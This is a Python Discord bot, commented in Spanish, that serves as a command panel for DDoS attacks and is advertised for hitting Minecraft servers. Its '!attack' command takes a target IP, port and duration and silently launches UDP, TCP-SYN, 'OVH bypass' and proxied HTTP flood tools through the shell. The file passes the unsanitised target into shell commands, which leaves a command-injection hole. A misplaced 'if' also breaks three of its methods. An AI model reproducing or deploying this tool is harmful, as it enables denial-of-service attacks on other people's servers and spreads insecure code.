import os
import discord
from discord.ext import commands
import asyncio
import tempfile
import subprocess
import sys

BOT_PREFIX = '!'
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents, help_command=None)

# ========== SISTEMA DE TOKEN (ENV VAR) ==========
def get_token():
    env_token = os.getenv('DISCORD_TOKEN')

    if env_token:
        print("[INFO] Token cargado desde la variable de entorno 'DISCORD_TOKEN'")
        return env_token
    else:
        print("\n" + "="*60)
        print("CONFIGURACIÓN REQUERIDA")
        print("="*60)
        print("1. Discord Developers → Applications → Bot → Copy Token")
        print("2. Define la variable de entorno 'DISCORD_TOKEN'")
        print("   en tu sistema o en el entorno de ejecución (GitHub Secrets).")
        print("="*60)
        print("[ERROR] Token no proporcionado en la variable de entorno 'DISCORD_TOKEN'")
        exit(1)

@bot.event
async def on_ready():
    print(f'[✓] Bot: {bot.user.name}')
    print(f'[✓] Modo sigiloso: ACTIVADO')
    print(f'[✓] Prefijo: {BOT_PREFIX}')
    print(f'[✓] Métodos: udp, udphex, udppps, ovh, tcp, tcp-syn, httpsrequest, udppayload, udpflood, udpbypass')
    await bot.change_presence(activity=discord.Game(name="DDoS Attack Minecraft Servers"))

# ========== EJECUCIÓN SILENCIOSA ==========
async def ejecutar_silencioso(comando: str, desc: str = ""):
    try:
        proceso = await asyncio.create_subprocess_shell(
            comando,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL
        )
        print(f"[RUN] {desc}: {comando[:80]}..." if len(comando) > 80 else f"[RUN] {desc}: {comando}")
        return True
    except Exception as e:
        print(f"[ERROR] {e}")
        return False

# ========== TODOS LOS MÉTODOS ==========
@bot.command(name='attack')
async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiempo: str = None, *, payload: str = None):
    print(f"\n[CMD] {ctx.author} → !attack {metodo} {ip}:{port} {tiempo}s")

    if not all([metodo, ip, port, tiempo]):
        return

    try:
        port_int = int(port)
        tiempo_int = int(tiempo)
    except ValueError:
        print("[ERROR] Puerto y tiempo deben ser números")
        return

    if port_int < 1 or port_int > 65535:
        print("[ERROR] Puerto no valido")
        return
    if tiempo_int <= 0:
        print("[ERROR] El tiempo debe ser mayor a 0")
        return

    comando = None
    desc = ""

    # ========== UDP ==========
    if metodo == 'udp':
        comando = f'./udp {ip} {port_int} -t 32 -s 64 -d {tiempo_int}'
        desc = "UDP Flood"

    # ========== UDPHEX ==========
    elif metodo == 'udphex':
        comando = f'./udphex {ip} {port_int} {tiempo_int}'
        desc = "UDPHEX"

    # ========== UDPPPS ==========
    elif metodo == 'udppps':
        comando = f'./udppps {ip} {port_int} {tiempo_int}'
        desc = "UDPPPS"

    # ========== OVH ==========
    if metodo == 'ovh':
        comando = f'sudo ./ovh {ip} {port_int} 20 -1 {tiempo_int}'
        desc = "OVH Bypass"

    # ========== TCP ==========
    elif metodo == 'tcp':
        comando = f'./tcp {ip} {port_int} {tiempo_int}'
        desc = "TCP Flood"

    # ========== TCP-SYN ==========
    elif metodo == 'tcp-syn':
        comando = f'./tcp-syn {ip} {port_int} {tiempo_int}'
        desc = "TCP SYN Flood (Multi)"

    # =========== UDPFLOOD ==========
    elif metodo == 'udpflood':
        comando = f'go run udpflood.go {ip} {port_int} {tiempo_int}'
        desc = "UDP Flood (GO)"

    # ========== UDPBYPASS ==========
    elif metodo == 'udpbypass':
        comando = f'./udpbypass {ip} {port_int} {tiempo_int}'
        desc = "UDP Bypass"

    # ========== HTTP-REQUEST ==========
    elif metodo == 'httpsrequest':
        comando = f'node gravitus.js {ip} {tiempo_int} 30 10 proxy.txt'
        desc = "HTTPs-Request (Proxy)"

    # ========== UDPPAYLOAD ==========
    elif metodo == 'udppayload':
        if payload:
            if len(payload) > 250:
                print("[ERROR] Payload maximo 250 bytes")
                return

            try:
                # Crear archivo temporal con el payload
                with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
                    f.write(payload)
                    temp_file = f.name

                comando = f'./udppayload {ip} {port_int} {tiempo_int} "{temp_file}"'
                desc = f"UDP Payload ({len(payload)} bytes)"

                # Programar eliminación del archivo temporal
                async def cleanup_tempfile():
                    await asyncio.sleep(2)
                    try:
                        os.unlink(temp_file)
                    except:
                        pass

                asyncio.create_task(cleanup_tempfile())

            except Exception as e:
                print(f"[ERROR] Payload: {e}")
                return
        else:
            print("[ERROR] Falta el payload")
            return

    # ========== MÉTODO NO VÁLIDO ==========
    else:
        print("[ERROR] Metodo no valido")
        return

    # ========== EJECUTAR COMANDO ==========
    if comando:
        asyncio.create_task(ejecutar_silencioso(comando, desc))
        print(f"[EXEC] {desc} → {ip}:{port_int} por {tiempo_int}s")

# ========== COMANDO METHODS (SOLO LOG) ==========
@bot.command(name='methods')
async def show_methods(ctx):
    print(f"[CMD] {ctx.author} solicitó lista de métodos")
    # NO ENVIAR NADA - MODO SIGILOSO

# ========== COMANDO STATUS (SOLO LOG) ==========
@bot.command(name='status')
async def bot_status(ctx):
    print(f"[CMD] {ctx.author} solicitó estado")
    # NO ENVIAR NADA - MODO SIGILOSO

# ========== COMANDO STOP (SOLO LOG) ==========
@bot.command(name='stop')
async def stop_bot(ctx):
    print(f"[CMD] {ctx.author} ejecutó comando stop")
    # NO ENVIAR NADA - MODO SIGILOSO

# ========== INICIO ==========
if __name__ == "__main__":
    print("\n" + "="*60)
    print("BOT UDP - TODOS LOS MÉTODOS ACTIVOS")
    print("="*60)

    TOKEN = get_token()

    if not TOKEN or len(TOKEN) < 10:
        print("[ERROR] Token inválido. Verifica la variable de entorno DISCORD_TOKEN")
        exit(1)

    print("[INFO] Métodos disponibles:")
    print("  !attack udp [IP] [PUERTO] [TIEMPO]")
    print("  !attack udphex [IP] [PUERTO] [TIEMPO]")
    print("  !attack udppps [IP] [PUERTO] [TIEMPO]")
    print("  !attack ovh [IP] [PUERTO] [TIEMPO]")
    print("  !attack tcp [IP] [PUERTO] [TIEMPO]")
    print("  !attack tcp-syn [IP] [PUERTO] [TIEMPO]")
    print("  !attack httpsrequest [IP] [PUERTO] [TIEMPO]")
    print("  !attack udppayload [IP] [PUERTO] [TIEMPO] [PAYLOAD]")
    print("  !attack udpflood [IP] [PUERTO] [TIEMPO]")
    print("  !attack udpbypass [IP] [PUERTO] [TIEMPO]")
    print("="*60 + "\n")

    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("[ERROR] Token incorrecto. Verifica la variable de entorno DISCORD_TOKEN")
        exit(1)
    except Exception as e:
        print(f"[ERROR] {e}")
        exit(1)
